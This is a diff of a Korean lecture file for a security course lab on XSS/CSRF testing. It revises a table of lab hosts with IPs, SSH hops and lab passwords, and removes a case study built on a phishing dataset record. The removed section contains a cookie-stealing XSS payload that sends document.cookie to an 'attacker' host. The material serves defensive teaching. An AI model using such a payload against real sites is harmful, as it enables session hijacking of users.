@@ -13,14 +13,16 @@
 
 | 컨테이너 | 6v6 IP | 역할 | 접속 |
 |---------|--------|------|------|
-| bastion | 10.20.30.201 | Control Plane (Bastion) | `ssh 6v6-bastion` (pw: ccc) |
-| fw (secu) | 10.20.30.1 | 방화벽/HAProxy/Suricata ext | `ssh 6v6-fw` |
-| web | 10.20.32.80 | Apache + ModSecurity + JuiceShop | `ssh 6v6-web` |
-| siem | 10.20.32.100 | Wazuh manager + alerts.json | `ssh 6v6-siem` |
-| attacker | 10.20.30.202 | pen-test 도구 | `ssh 6v6-attacker` |
+| bastion | 10.20.30.201 (ext) | 학생 진입점 + Bastion 운영 에이전트 | `ssh 6v6-bastion` (pw: ccc) |
+| attacker | 10.20.30.202 (ext) | 공격 도구 (curl/nmap/nikto/whatweb/sqlmap) | `ssh 6v6-attacker` |
+| fw | 10.20.30.1 (ext) + 10.20.31.1 (pipe) | nftables + HAProxy host-header 라우팅 | `ssh 6v6-fw` (ProxyJump bastion) |
+| ips | 10.20.31.2 (pipe) + 10.20.32.1 (dmz) | Suricata IPS | `ssh 6v6-ips` (ProxyJump fw) |
+| web | 10.20.32.80 (dmz) + 10.20.40.80 (int) | Apache + ModSecurity + JuiceShop/DVWA reverse | `ssh 6v6-web` (ProxyJump fw) |
+| siem | 10.20.32.100 (dmz) | Wazuh Manager (`/var/ossec/...`) | `ssh 6v6-siem` (ProxyJump fw, pw: ccc) |
 
-**Bastion API:** `http://192.168.0.103:8003` / Key: `ccc-api-key-2026`
-**CCC API:** `http://localhost:9100` / Key: `ccc-api-key-2026`
+**Bastion API:** `http://192.168.0.110:9200` (학생 PC 에서 직접 가능)
+**Wazuh Dashboard (HTTPS UI):** `https://siem.6v6.lab/` (admin / SecretPassword)
+**Juice Shop (학생 브라우저 대상):** `http://juice.6v6.lab/` (HAProxy host header → web)
 
 ## 강의 시간 배분 (3시간)
 
@@ -678,55 +680,6 @@ done
 
 ---
 
-## 실제 사례 (WitFoo Precinct 6 — Email Phishing block 1건)
-
-> 출처: WitFoo Precinct 6 Cybersecurity Dataset (Apache 2.0)
-> 본 lecture *XSS / CSRF 점검* 과 직접 매핑되는 *web request* 는 dataset 에 부족 — 대신 *공격자가 web 외 channel 로 유사 payload 를 전달* 하는 **email_protection_event 차단** record 를 발췌 (XSS/CSRF 가 *web 단독 채널이 아니라 email link/HTML 도 사용* 한다는 학습 강화).
-
-### Case 1: email_protection block — phishingScore=100, threatID 해시
-
-**원본 발췌**:
-
-```text
-mo_name=Phishing  action=block  severity=critical  dst=100.64.28.102
-ORG-1780 ::: HOST-0121=block ::: CRED-23501={
-  "spamSHOST-54395":100,
-  "phishSHOST-54395":100,
-  "threatsORG-0706Map":[
-    {"threatID":"f34c7acc128cd0a3c8409a6f00CRED-2962552fc3373ab290acdc9be2f2ecfe99feaf5",
-     "th..."}
-  ]
-}
-```
-
-**dataset 의 email_protection_event 통계**
-
-| 항목 | 값 |
-|------|---|
-| dst 동일 IP `100.64.28.102` | 다수 차단 이벤트 |
-| phishScore | 100 (max) |
-| spamScore | 100 (max) |
-| threatID | sha256 해시 — *동일 phishing 캠페인* 추적 키 |
-| Precinct 6 mo_name | `Phishing` (전체 dataset 에서 8건 확인된 희귀 라벨) |
-
-**해석 — 본 lecture 와의 매핑**
-
-| XSS/CSRF 점검 학습 항목 | 본 record 에서의 증거 |
-|------------------------|---------------------|
-| **다중 channel 공격** | XSS payload 는 web reflected/stored 외에 *email HTML body* 로도 전달. 본 record 가 email channel 차단 사례 — XSS 점검 시 *email-to-web flow* 도 시나리오로 |
-| **threatID 해시 추적** | sha256 형태의 threatID — XSS payload 도 *해시 기반 IOC* 로 관리 가능. 점검 보고서에 발견 payload SHA-256 기재 |
-| **score 임계 100** | phish/spam 모두 max = *고확신* 차단. 점검 시 *동일 score 정책* 으로 XSS payload 분류 (suspicion ≥ 0.8 자동 차단) |
-| **CSRF token 부재** | (본 record 자체엔 web token 정보 없음) — 학습 시 *email link 가 CSRF 시작점이 될 수 있음* — 1-click 으로 victim browser 에서 인증된 세션의 state 변경 트리거 |
-
-**점검 액션**:
-1. WAF + Email gateway 가 *동일 threatID* 로 IOC 공유하는지 확인 (현재 dataset 은 양 channel 분리 운영)
-2. 자체 점검 시 XSS payload 를 *email HTML* 에 삽입한 시나리오 추가 (e.g. `<img src=x onerror=fetch('//attacker/'+document.cookie)>` 가 SEG 통과하는지)
-3. CSRF 점검은 *Origin/Referer 헤더 검증* 외에 *email-link → 인증된 세션 액션* 추적 시나리오 포함
-
-
-
-
----
 
 ## 부록: 학습 OSS 도구 매트릭스 (lab week06 — 인증/세션)
 
